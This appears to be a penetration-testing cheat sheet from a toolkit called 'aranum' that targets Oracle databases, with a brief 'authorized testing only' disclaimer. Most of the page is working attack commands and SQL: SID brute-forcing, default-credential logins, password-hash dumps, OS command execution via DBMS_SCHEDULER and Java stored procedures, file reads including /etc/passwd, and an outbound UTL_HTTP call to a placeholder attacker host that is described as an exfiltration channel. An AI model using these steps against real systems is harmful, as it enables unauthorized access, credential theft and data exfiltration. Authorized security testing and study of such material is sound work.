---
service: oracle
title: Oracle Database
ports: 1521, 1522, 1526
aliases: oracle-db, oracledb, tns
---

# Oracle — quick wins

**When you see it:** 1521/tcp open with an Oracle TNS banner → enumerate SIDs
first (you cannot connect without one), then try default credentials. Most quick
wins here are gated behind a valid SID + working creds; ODAT automates the
full post-auth escalation chain.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to or
> execute on the target — get sign-off before running.

## Triage (read-only)
```sh
# TNS version + SID brute-force
nmap -sT -p1521 --script oracle-tns-version,oracle-sid-brute H

# Manual SID enumeration (tnscmd10g)
tnscmd10g version -h H -p 1521
tnscmd10g status  -h H -p 1521   # may expose SID in listener status

# ODAT all-in-one SID discovery + default creds
odat sidguesser -s H -p 1521
odat passwordguesser -s H -p 1521 -d SID --accounts-file /usr/share/odat/accounts/accounts.txt

# Connect (requires SID)
sqlplus U/P@H:1521/SID
```

## Quick wins

### Default credentials
```sh
# Common pairs — try each with discovered SID
sqlplus sys/change_on_install@H:1521/SID as sysdba
sqlplus system/manager@H:1521/SID
sqlplus scott/tiger@H:1521/SID
sqlplus dbsnmp/dbsnmp@H:1521/SID
sqlplus outln/outln@H:1521/SID
```
*Why:* Oracle ships with several built-in accounts that many installs leave
unchanged. `sys as sysdba` is the highest-privilege path.

### Dump password hashes
```sql
-- Requires DBA or SELECT on SYS.DBA_USERS
SELECT username, password FROM dba_users WHERE account_status='OPEN';
-- 12c+ stores verifiers in SYS.USER$; older versions use DES-CBC 'H:...' format
SELECT name, password, spare4 FROM sys.user$ WHERE password IS NOT NULL;
```
*Why:* Oracle hashes are DES (10g), SHA-1 (11g `S:` verifier in `spare4`), or
PBKDF2-SHA512 (12c+ `T:` verifier). The 10g DES hashes (8-char uppercase input)
are crackable quickly; 11g SHA-1 verifiers are also hashcat-viable (mode 112).

### DBMS_SCHEDULER RCE ✏️
```sql
-- Requires CREATE JOB or EXECUTE on DBMS_SCHEDULER + OS access from DB context
BEGIN
  DBMS_SCHEDULER.create_job(
    job_name   => 'PWNJOB',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/sh',
    extra      => '-c "id > /tmp/oracle_rce.txt"',
    enabled    => TRUE,
    auto_drop  => TRUE
  );
END;
/
-- Read output: SELECT bfilename('TMPDIR','oracle_rce.txt') FROM dual;
```
*Why:* `DBMS_SCHEDULER` with `EXECUTABLE` type runs OS binaries as the Oracle
OS user. Requires `CREATE JOB` privilege (granted to DBA by default) and the OS
`extjob` binary to be reachable.

### Java stored procedure RCE ✏️
```sql
-- Requires JAVA privilege (CREATE PROCEDURE, EXECUTE on java.lang.Runtime)
SELECT DBMS_JAVA.runjava('oracle/aurora/util/Wrapper /bin/sh -c "id>/tmp/j.txt"') FROM dual;
-- Or via CREATE AND COMPILE JAVA SOURCE:
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "Exec" AS
  import java.lang.*; import java.io.*;
  public class Exec {
    public static String run(String cmd) throws Exception {
      return new String(Runtime.getRuntime().exec(cmd).getInputStream().readAllBytes());
    }
  };
/
CREATE OR REPLACE FUNCTION exec_cmd(p_cmd VARCHAR2) RETURN VARCHAR2
  AS LANGUAGE JAVA NAME 'Exec.run(java.lang.String) return java.lang.String';
/
SELECT exec_cmd('id') FROM dual;
```
*Why:* Java is embedded in Oracle DB and runs with OS-level access. Requires
the Java VM option enabled (`SELECT * FROM v$option WHERE parameter='Java'`)
and appropriate `GRANT JAVAUSERPRIV` / `GRANT JAVASYSPRIV TO user`.

### UTL_FILE — read/write server files ✏️
```sql
-- Read a file (requires CREATE DIRECTORY or DBA, and UTL_FILE_DIR parameter)
CREATE OR REPLACE DIRECTORY tmpdir AS '/tmp';
DECLARE
  fh  UTL_FILE.FILE_TYPE;
  buf VARCHAR2(32767);
BEGIN
  fh := UTL_FILE.FOPEN('TMPDIR', 'oracle_rce.txt', 'r', 32767);
  UTL_FILE.GET_LINE(fh, buf); DBMS_OUTPUT.PUT_LINE(buf);
  UTL_FILE.FCLOSE(fh);
END;
/
```
*Why:* `UTL_FILE` reads and writes files in OS directories mapped to Oracle
`DIRECTORY` objects — useful for reading config files or writing web content
if the Oracle user owns the webroot.

### UTL_HTTP — SSRF / outbound probe ✏️
```sql
SELECT UTL_HTTP.request('http://ATT:8080/test') FROM dual;
```
*Why:* `UTL_HTTP` makes outbound HTTP calls from the DB server — confirms
outbound connectivity, triggers SSRF against internal services, and can
exfiltrate data via GET parameters if no egress filter is in place.

### ODAT — automated post-auth escalation
```sh
# Full scan of all modules with known creds
odat all -s H -p 1521 -d SID -U U -P P

# Targeted: test for OS command execution paths
odat dbmsscheduler -s H -p 1521 -d SID -U U -P P --exec id
odat java         -s H -p 1521 -d SID -U U -P P --exec id
odat utlfile      -s H -p 1521 -d SID -U U -P P --getFile /etc/passwd /tmp/passwd.txt
```
*Why:* ODAT (Oracle DB Attack Tool) systematically tests every escalation
module and reports which privileges allow which action — the fastest way to map
what a given account can actually do.

## aranum helpers
- `aranumtoolkit/network/enum-oracle.sh` — produced this finding (TNS version,
  `oracle-sid-brute` NSE, `tnscmd10g` version/status, SID list extraction).
- No standalone exploit helper exists; use `odat` and `sqlplus` manually per
  the steps above.

## Gotchas
- Without a valid SID, nothing works — SID enumeration is step zero. The nmap
  `oracle-sid-brute` NSE wordlist is short; supplement with `odat sidguesser`
  which uses a larger list including common names (ORCL, XE, DB, PROD, TEST).
- Oracle 12c+ requires the TNS listener to be registered with a password for
  remote management (CVE-2012-1675 TNS poisoning is pre-12c only).
- `sys as sysdba` requires the `SYSDBA` privilege and may need to connect
  via `/ as sysdba` locally or with `-sysdba` in ODAT.
- Java VM is not installed in Express Edition (XE) — the Java RCE path is
  unavailable there.
- This page is intentionally thinner than mysql/postgres/mssql: almost all
  Oracle quick wins are gated behind a valid SID + valid credentials. The
  practical workflow is `enum-oracle.sh` → SID → default creds → `odat all`.

## Sources
- HackTricks `1521-1522-1529-pentesting-oracle-listener`; ODAT GitHub
  (quentinhardy/odat); PayloadsAllTheThings Oracle injection section;
  Hackviser Oracle DB enumeration guide; CVE-2012-1675 advisory.
